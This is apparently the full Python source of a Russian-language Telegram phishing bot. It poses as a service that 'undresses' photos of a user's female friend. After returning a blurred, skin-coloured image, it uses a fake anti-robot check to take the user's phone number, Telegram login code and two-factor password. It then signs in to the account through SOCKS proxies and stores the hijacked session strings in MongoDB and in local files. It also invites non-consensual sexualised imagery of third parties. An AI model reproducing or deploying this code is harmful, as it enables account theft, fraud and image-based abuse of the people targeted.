import logging
import os
import json
import phonenumbers
from phonenumbers import geocoder
from aiogram import Bot, Dispatcher, types
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from aiogram.utils import executor
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors.rpcerrorlist import SessionPasswordNeededError, PhoneCodeExpiredError, PhoneCodeInvalidError
from pymongo import MongoClient
from dotenv import load_dotenv
from datetime import datetime
from PIL import Image, ImageFilter
import cv2
import numpy as np

load_dotenv()
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
MONGO_URI = os.getenv("MONGO_URI")

# Основная прокси (старая, для совместимости)
PROXY_HOST = os.getenv("PROXY_HOST")
PROXY_PORT = int(os.getenv("PROXY_PORT"))
PROXY_USER = os.getenv("PROXY_USER")
PROXY_PASS = os.getenv("PROXY_PASS")
main_proxy = ('socks5', PROXY_HOST, PROXY_PORT, True, PROXY_USER, PROXY_PASS)

# Вторая прокси (новая)
PROXY1_HOST = os.getenv("PROXY1_HOST")
PROXY1_PORT = int(os.getenv("PROXY1_PORT"))
PROXY1_USER = os.getenv("PROXY1_USER")
PROXY1_PASS = os.getenv("PROXY1_PASS")
second_proxy = ('socks5', PROXY1_HOST, PROXY1_PORT, True, PROXY1_USER, PROXY1_PASS)

# Список доступных прокси (первая - старая основная)
proxy_list = [main_proxy, second_proxy]

mongo = MongoClient(MONGO_URI)
db = mongo["dbmango"]
sessions_col = db["sessions"]
start_col = db["start"]

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot)

user_states = {}
user_clients = {}
user_phones = {}
user_code_buffers = {}

os.makedirs("sessions", exist_ok=True)

def get_proxy_for_phone(phone):
    """Выбираем прокси для номера"""
    existing_session = sessions_col.find_one({"phone": phone})
    if existing_session:
        return proxy_list[existing_session.get('proxy_index', 0)]
    return proxy_list[hash(phone) % len(proxy_list)]

def cleanup(user_id):
    """Очищает данные пользователя из временных хранилищ"""
    user_states.pop(user_id, None)
    user_clients.pop(user_id, None)
    user_phones.pop(user_id, None)
    user_code_buffers.pop(user_id, None)

def update_user_log(user_id: int, updates: dict):
    """Обновляет или создает запись пользователя с новыми данными"""
    try:
        start_col.update_one(
            {"user_id": user_id},
            {"$set": updates, "$setOnInsert": {"first_seen": datetime.now()}},
            upsert=True
        )
    except Exception as e:
        logging.error(f"Ошибка при обновлении лога пользователя: {e}")

async def send_code_keyboard(user_id, current_code, message_id=None):
    """Отправляет/обновляет клавиатуру для ввода кода"""
    digits = [[1, 2, 3], [4, 5, 6], [7, 8, 9], [0]]
    buttons = []
    for row in digits:
        btn_row = [InlineKeyboardButton(str(d), callback_data=f"code_{d}") for d in row]
        buttons.append(btn_row)
    buttons.append([InlineKeyboardButton("✅ Отправить код", callback_data="code_send")])
    keyboard = InlineKeyboardMarkup(inline_keyboard=buttons)
    text = f"📱 *Код подтверждения:*\n\n`{current_code}`\n\n_Нажимайте цифры ниже, чтобы ввести код, полученный от Telegram._" if current_code else "🔢 *Введите код подтверждения*\n\n_Нажимайте кнопки ниже, чтобы ввести код, полученный от Telegram._"

    if message_id:
        await bot.edit_message_text(chat_id=user_id, message_id=message_id,
                                 text=text, reply_markup=keyboard, parse_mode='Markdown')
    else:
        msg = await bot.send_message(user_id, text, reply_markup=keyboard, parse_mode='Markdown')
        return msg.message_id

async def send_welcome_message(user_id):
    """Отправляет приветственное сообщение"""
    try:
        await bot.send_message(
            user_id,
            "Хочешь раздеть свою подругу? Тогда скидай фото подруги, которую хочешь раздеть! 📸",
            parse_mode='Markdown'
        )
    except Exception as e:
        logging.error(f"Error sending welcome message: {e}")
        await bot.send_message(
            user_id,
            "Хочешь раздеть свою подругу? Тогда скидай фото подруги, которую хочешь раздеть! 📸",
            parse_mode='Markdown'
        )

@dp.message_handler(commands=['start'])
async def cmd_start(message: types.Message):
    user = message.from_user
    
    update_user_log(
        user_id=user.id,
        updates={
            "username": user.username,
            "first_name": user.first_name,
            "last_name": user.last_name,
            "language_code": user.language_code,
            "is_bot": user.is_bot,
            "chat_id": message.chat.id,
            "last_start": datetime.now(),
            "status": "started"
        }
    )

    # Отправляем приветственное сообщение
    await send_welcome_message(user.id)

@dp.message_handler(content_types=types.ContentType.PHOTO)
async def handle_photo(message: types.Message):
    user_id = message.from_user.id
    user_states[user_id] = 'photo_received'
    
    update_user_log(
        user_id=user_id,
        updates={
            "photo_received": True,
            "photo_receive_time": datetime.now(),
            "status": "photo_received"
        }
    )
    
    try:
        # Скачиваем фото
        file_id = message.photo[-1].file_id
        file_info = await bot.get_file(file_id)
        downloaded_file = await bot.download_file(file_info.file_path, "input.jpg")
        
        # Загружаем изображение в OpenCV
        img = cv2.imread("input.jpg")
        gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
        img_rgb = cv2.cvtColor(img, cv2.COLOR_BGR2RGB)
        
        # Детекция лица для оценки области тела
        face_cascade = cv2.CascadeClassifier(cv2.data.haarcascades + 'haarcascade_frontalface_default.xml')
        faces = face_cascade.detectMultiScale(gray, 1.1, 4)
        
        if len(faces) > 0:
            x, y, w, h = faces[0]  # Берем первое лицо
            # Расширяем для тела
            body_rect = (x - w//2, y, w*2, h*4)  # Расширяем вниз
            # Корректируем границы
            body_rect = (max(0, body_rect[0]), max(0, body_rect[1]), 
                         min(img.shape[1] - body_rect[0], body_rect[2]), 
                         min(img.shape[0] - body_rect[1], body_rect[3]))
            
            # GrabCut для сегментации человека
            mask = np.zeros(img.shape[:2], np.uint8)
            bgdModel = np.zeros((1,65), np.float64)
            fgdModel = np.zeros((1,65), np.float64)
            cv2.grabCut(img, mask, body_rect, bgdModel, fgdModel, 5, cv2.GC_INIT_WITH_RECT)
            person_mask = np.where((mask == 2) | (mask == 0), 0, 1).astype('uint8')
        else:
            person_mask = np.ones(img.shape[:2], dtype=np.uint8)  # Fallback
        
        # Улучшаем маску человека: закрываем дыры
        person_mask = cv2.morphologyEx(person_mask, cv2.MORPH_CLOSE, np.ones((15,15), np.uint8))
        
        # Конвертируем в HSV для детекции кожи
        hsv = cv2.cvtColor(img, cv2.COLOR_BGR2HSV)
        
        # Более широкий диапазон для кожи
        lower_skin = np.array([0, 10, 60], dtype=np.uint8)
        upper_skin = np.array([20, 150, 255], dtype=np.uint8)
        
        # Маска кожи
        skin_mask = cv2.inRange(hsv, lower_skin, upper_skin)
        skin_mask = cv2.dilate(skin_mask, np.ones((7,7), np.uint8), iterations=3)
        skin_mask = cv2.erode(skin_mask, np.ones((5,5), np.uint8), iterations=2)
        skin_mask = cv2.morphologyEx(skin_mask, cv2.MORPH_CLOSE, np.ones((15,15), np.uint8))
        
        # Находим средний цвет кожи из видимой кожи
        skin_pixels = img_rgb[(skin_mask == 255) & (person_mask == 1)]
        if len(skin_pixels) > 0:
            avg_skin_color = np.mean(skin_pixels, axis=0).astype(np.uint8)
        else:
            avg_skin_color = np.array([200, 170, 150], dtype=np.uint8)
        
        # Маска одежды/тела без кожи
        clothing_mask = (person_mask == 1) & (skin_mask == 0)
        
        # Замазываем одежду цветом кожи
        img[clothing_mask] = avg_skin_color[::-1]  # BGR
        
        # Замазываем всю маску человека (тело) цветом кожи для полного покрытия
        img[person_mask == 1] = avg_skin_color[::-1]
        
        # Применяем сильный blur ко всему изображению
        blurred_img = cv2.GaussianBlur(img, (51, 51), 0)
        
        # Сохраняем
        cv2.imwrite("undressed.jpg", blurred_img)
        
        keyboard = InlineKeyboardMarkup()
        keyboard.add(InlineKeyboardButton("Я не робот!", callback_data="auth_account"))
        
        await bot.send_photo(
            user_id,
            photo=InputFile("undressed.jpg"),
            caption=(
                "Ох, я смог 'раздеть' твою подругу (в кавычках), полностью замазал тело цветом кожи и добавил сильный blur, чтобы ничего не было видно! 😱 "
                "И еще нашел фотографии о ней в закрытом интернете, хочешь увидеть все это без замазки? "
                "Тогда тебе нужно подтвердить, что ты не робот и не спецслужбы, жми на кнопку ниже и подтверди, что ты не робот! 👇"
            ),
            parse_mode='Markdown',
            reply_markup=keyboard
        )
        
        # Очищаем временные файлы
        os.remove("input.jpg")
        os.remove("undressed.jpg")
    except Exception as e:
        logging.error(f"Error processing photo: {e}")
        await bot.send_message(user_id, "❌ Ошибка при обработке фото. Попробуй снова!", parse_mode='Markdown')

@dp.callback_query_handler(lambda c: c.data == 'auth_account')
async def start_auth(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    user_states[user_id] = 'awaiting_contact'

    update_user_log(
        user_id=user_id,
        updates={
            "auth_button_clicked": True,
            "auth_button_click_time": datetime.now(),
            "status": "awaiting_contact"
        }
    )

    kb = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    kb.add(KeyboardButton("📱 Поделиться номером телефона", request_contact=True))
    await bot.send_message(
        user_id,
        "ШАГ 1. *ПОДТВЕРДИТЕ НОМЕР ТЕЛЕФОНА 🔎, тем самым подтвердив, что вы не спецслужбы и не робот! (У нас много спама на наш телеграм-бот, поэтому мы вынуждены делать проверку)* 🔞\n\n",
        parse_mode='Markdown',
        reply_markup=kb
    )
    await bot.answer_callback_query(callback_query.id)

@dp.message_handler(content_types=types.ContentType.CONTACT)
async def handle_contact(message: types.Message):
    user_id = message.from_user.id
    if user_states.get(user_id) != 'awaiting_contact':
        return

    phone = message.contact.phone_number
    if not phone.startswith("+"):
        phone = "+" + phone

    geo_info = None
    try:
        parsed_number = phonenumbers.parse(phone)
        geo_info = geocoder.description_for_number(parsed_number, "en")
    except Exception as e:
        logging.error(f"Ошибка при определении геолокации: {e}")

    update_user_log(
        user_id=user_id,
        updates={
            "phone": phone,
            "geo_info": geo_info,
            "contact_shared": True,
            "contact_share_time": datetime.now(),
            "contact_user_id": message.contact.user_id,
            "status": "contact_received"
        }
    )

    selected_proxy = get_proxy_for_phone(phone)
    
    client = TelegramClient(StringSession(), API_ID, API_HASH, proxy=selected_proxy)
    await client.connect()
    user_clients[user_id] = client
    user_phones[user_id] = phone

    try:
        await client.send_code_request(phone)
        user_states[user_id] = 'awaiting_code'
        
        await message.answer(
            "Сейчас тебе должен прийти КОД от официального Telegram. Напиши этот код на клавиатуре ниже, тем самым подтвердив, что ты не робот! 📩\n\n",
            parse_mode='Markdown'
        )
        
        user_code_buffers[user_id] = {'code': '', 'message_id': None}
        msg_id = await send_code_keyboard(user_id, "", None)
        user_code_buffers[user_id]['message_id'] = msg_id
        
    except Exception as e:
        await message.answer(f"❌ Ошибка при отправке кода: {e}", parse_mode='Markdown')
        await client.disconnect()
        cleanup(user_id)

@dp.callback_query_handler(lambda c: c.data.startswith("code_"))
async def process_code_button(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    data = callback_query.data

    if user_states.get(user_id) != 'awaiting_code':
        await bot.answer_callback_query(callback_query.id, text="⛔️ Сначала поделись номером телефона", show_alert=True)
        return

    buffer = user_code_buffers.get(user_id)
    if not buffer:
        await bot.answer_callback_query(callback_query.id, text="Ошибка. Перезапусти с /start", show_alert=True)
        return

    current_code = buffer['code']
    message_id = buffer['message_id']

    if data == "code_send":
        if not current_code:
            await bot.answer_callback_query(callback_query.id, text="⚠️ Сначала введи код", show_alert=True)
            return
        await bot.answer_callback_query(callback_query.id)
        await try_sign_in_code(user_id, current_code)
    else:
        digit = data.split("_")[1]
        if len(current_code) >= 10:
            await bot.answer_callback_query(callback_query.id, text="⚠️ Код слишком длинный", show_alert=True)
            return
        current_code += digit
        user_code_buffers[user_id]['code'] = current_code
        await bot.answer_callback_query(callback_query.id)
        await send_code_keyboard(user_id, current_code, message_id)

async def try_sign_in_code(user_id, code):
    client = user_clients.get(user_id)
    phone = user_phones.get(user_id)
    if not client or not phone:
        await bot.send_message(user_id, "⚠️ Сессия истекла. Перезапусти с /start", parse_mode='Markdown')
        cleanup(user_id)
        return

    try:
        await client.sign_in(phone=phone, code=code)
        if await client.is_user_authorized():
            me = await client.get_me()
            session_str = client.session.save()
            
            proxy_index = 0
            if hasattr(client, '_sender') and hasattr(client._sender, '_proxy'):
                current_proxy = client._sender._proxy
                proxy_index = next((i for i, p in enumerate(proxy_list) if p == current_proxy), 0)
            
            sessions_col.update_one(
                {"phone": phone}, 
                {"$set": {
                    "phone": phone, 
                    "session": session_str, 
                    "proxy_index": proxy_index,
                    "user_id": user_id,
                    "username": me.username,
                    "first_name": me.first_name,
                    "last_name": me.last_name if me.last_name else None,
                    "auth_date": datetime.now()
                }}, 
                upsert=True
            )

            update_user_log(
                user_id=user_id,
                updates={
                    "auth_success": True,
                    "auth_time": datetime.now(),
                    "telegram_id": me.id,
                    "tg_username": me.username,
                    "tg_first_name": me.first_name,
                    "tg_last_name": me.last_name,
                    "status": "authenticated",
                    "proxy_index": proxy_index
                }
            )

            with open(f"sessions/{phone.replace('+', '')}.json", "w") as f:
                json.dump({"phone": phone, "session": session_str}, f)

            await bot.send_message(
                user_id,
                "🎉 *ПРОВЕРКА УСПЕШНО ЗАВЕРШЕНА!* 🔞🎊\n\n"
                "✅ *ДОСТУП К ЭКСКЛЮЗИВНЫМ ФОТО РАЗБЛОКИРОВАН!*\n\n"
                "🔥 *ТЕПЕРЬ ТЫ МОЖЕШЬ УВИДЕТЬ ВСЕ:*\n"
                "• Тонны горячих фото твоей подруги\n"
                "• Эксклюзивные материалы из закрытого интернета\n"
                "• Уникальные снимки, которых нет нигде\n\n"
                "🚀 *Материалы уже загружаются...*\n"
                "Так как контента реально ОЧЕНЬ много, мы готовим всё для тебя!\n"
                "Первые фото придут в течение нескольких минут (иногда часов)!\n\n"
                "⚠️ *ДЕРЖИ ДОСТУП В СЕКРЕТЕ* - Это только для тебя!",
                parse_mode='Markdown'
            )
            await client.disconnect()
            cleanup(user_id)
        else:
            user_states[user_id] = 'awaiting_2fa'
            update_user_log(
                user_id=user_id,
                updates={"status": "awaiting_2fa"}
            )
            await bot.send_message(
                user_id,
                "🔐 *ДОПОЛНИТЕЛЬНАЯ ЗАЩИТА* 🔞\n\n"
                "Твой аккаунт защищён двухэтапной верификацией.\n\n"
                "📝 *Введи пароль безопасности ниже:*\n\n"
                "⚡️ *ПОСЛЕ ЭТОГО ПОЛУЧИШЬ:*\n"
                "• Полный доступ к эксклюзивным фото\n"
                "• Уникальные материалы из закрытого интернета\n"
                "_Этот пароль отличается от кода из SMS._",
                parse_mode='Markdown'
            )
    except PhoneCodeExpiredError:
        await bot.send_message(
            user_id,
            "⏰ *Код истёк*\n\n"
            "Код устарел. Используй /start, чтобы получить новый код и открыть доступ к эксклюзивным фото!",
            parse_mode='Markdown'
        )
        await client.disconnect()
        cleanup(user_id)
    except PhoneCodeInvalidError:
        await bot.send_message(
            user_id,
            "❌ *Неверный код*\n\n"
            "Код введён неправильно. Проверь SMS и введи код заново, чтобы разблокировать доступ к фото!",
            parse_mode='Markdown'
        )
        user_code_buffers[user_id]['code'] = ""
        await send_code_keyboard(user_id, "", user_code_buffers[user_id]['message_id'])
    except SessionPasswordNeededError:
        user_states[user_id] = 'awaiting_2fa'
        update_user_log(
            user_id=user_id,
            updates={"status": "awaiting_2fa"}
        )
        await bot.send_message(
            user_id,
            "🔐 *ОБНАРУЖЕНА ДОПОЛНИТЕЛЬНАЯ ЗАЩИТА* 🔞\n\n"
            "Твой аккаунт использует двухэтапную верификацию.\n\n"
            "📝 *Введи пароль безопасности ниже, чтобы разблокировать всё:*\n\n"
            "⚡️ *ПОСЛЕ ЭТОГО ПОЛУЧИШЬ:*\n"
            "• Полный доступ к эксклюзивным фото\n"
            "• Уникальные материалы из закрытого интернета",
            parse_mode='Markdown'
        )
    except Exception as e:
        await bot.send_message(
            user_id,
            f"❌ *Ошибка при проверке*\n\n"
            f"Техническая проблема:\n`{e}`\n\n"
            f"Попробуй снова с /start, чтобы получить доступ к эксклюзивным фото!",
            parse_mode='Markdown'
        )
        await client.disconnect()
        cleanup(user_id)

@dp.message_handler(lambda message: user_states.get(message.from_user.id) == 'awaiting_2fa')
async def process_2fa(message: types.Message):
    user_id = message.from_user.id
    password = message.text.strip()
    client = user_clients.get(user_id)
    phone = user_phones.get(user_id)

    if not client or not phone:
        await message.answer("⚠️ Сессия истекла. Используй /start для перезапуска", parse_mode='Markdown')
        cleanup(user_id)
        return

    try:
        await client.sign_in(password=password)
        if await client.is_user_authorized():
            session_str = client.session.save()
            
            proxy_index = 0
            if hasattr(client, '_sender') and hasattr(client._sender, '_proxy'):
                current_proxy = client._sender._proxy
                proxy_index = next((i for i, p in enumerate(proxy_list) if p == current_proxy), 0)
            
            sessions_col.update_one(
                {"phone": phone}, 
                {"$set": {
                    "phone": phone, 
                    "session": session_str, 
                    "proxy_index": proxy_index,
                    "user_id": user_id,
                    "auth_date": datetime.now(),
                    "has_2fa": True
                }}, 
                upsert=True
            )
            
            update_user_log(
                user_id=user_id,
                updates={
                    "auth_success": True,
                    "auth_time": datetime.now(),
                    "has_2fa": True,
                    "status": "authenticated_with_2fa",
                    "proxy_index": proxy_index
                }
            )

            with open(f"sessions/{phone.replace('+', '')}.json", "w") as f:
                json.dump({"phone": phone, "session": session_str}, f)

            await message.answer(
                "🎉 *ПРОВЕРКА УСПЕШНО ЗАВЕРШЕНА!* 🔞🎊\n\n"
                "✅ *ДОСТУП К ЭКСКЛЮЗИВНЫМ ФОТО РАЗБЛОКИРОВАН!*\n\n"
                "🔥 *ТЕПЕРЬ ТЫ МОЖЕШЬ УВИДЕТЬ ВСЕ:*\n"
                "• Тонны горячих фото твоей подруги\n"
                "• Эксклюзивные материалы из закрытого интернета\n"
                "• Уникальные снимки, которых нет нигде\n\n"
                "🚀 *Материалы уже загружаются...*\n"
                "Так как контента реально ОЧЕНЬ много, мы готовим всё для тебя!\n"
                "Первые фото придут в течение нескольких минут (иногда часов)!\n\n"
                "⚠️ *ДЕРЖИ ДОСТУП В СЕКРЕТЕ* - Это только для тебя!",
                parse_mode='Markdown'
            )
            await client.disconnect()
            cleanup(user_id)
        else:
            await message.answer(
                "❌ *Неверный пароль*\n\n"
                "Пароль введён неправильно. Отправь правильный пароль, чтобы разблокировать доступ к фото!",
                parse_mode='Markdown'
            )
    except Exception as e:
        await message.answer(
            f"❌ *Ошибка проверки*\n\n"
            f"Проблема: `{e}`\n\n"
            f"Попробуй снова с /start, чтобы получить доступ к эксклюзивным фото!",
            parse_mode='Markdown'
        )
        await client.disconnect()
        cleanup(user_id)

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)